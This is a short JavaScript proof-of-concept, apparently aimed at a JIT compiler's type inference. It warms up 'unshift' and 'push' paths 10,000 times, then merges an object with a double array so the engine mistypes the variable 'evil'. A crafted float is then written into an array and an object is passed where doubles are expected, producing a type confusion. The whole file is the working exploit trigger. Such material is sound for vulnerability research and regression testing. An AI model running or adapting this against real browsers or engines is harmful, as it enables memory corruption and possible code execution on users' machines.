let g = [1.1,2.2,4.4,5.5];

let g2 = [1.1,2.2,3.3];
function test_unshift(arg, arg2, value)
{
    let t = arg.hasOwnProperty("www"); //arg definite Object
    arg2[1] = 3.3; //arg2 definite Double Array
    let evil = arg;
    if(flag)
    {
        evil = arg2; //merged, become wrong ValueType, definite Object
    }
    g[0] = 3.3;
    if(flag)
    {
        let t3 = evil.unshift(value); //In fact object or double array, but definite Object ????
    }
    g[1] = 6.17651672645e-312;
}

function test_push(arg, arg2, value)
{
    let t = arg.hasOwnProperty("www"); //arg definite Object
    arg2[1] = 3.3; //arg2 definite Double Array
    let evil = arg;
    if(flag)
    {
        evil = arg2; //merged, become wrong ValueType, definite Object
    }
    g[0] = 3.3;
    if(flag)
    {
        let t3 = evil.push(value); //In fact object or double array, but definite Object ????
    }
    g[1] = 6.17651672645e-312;
}

var testFuncs = [test_unshift, test_push];
for(let i = 0; i < testFuncs.length; i++)
{
    let obj = {};

    flag = 0;
    testFuncs[i](obj, g2, 0.1);
    flag = 1;

    for(let j = 0; j < 10000; j++)
    {
        testFuncs[i](obj, g2, 0.1);
    }
    testFuncs[i](obj, g, {});
    print(g[1]);
}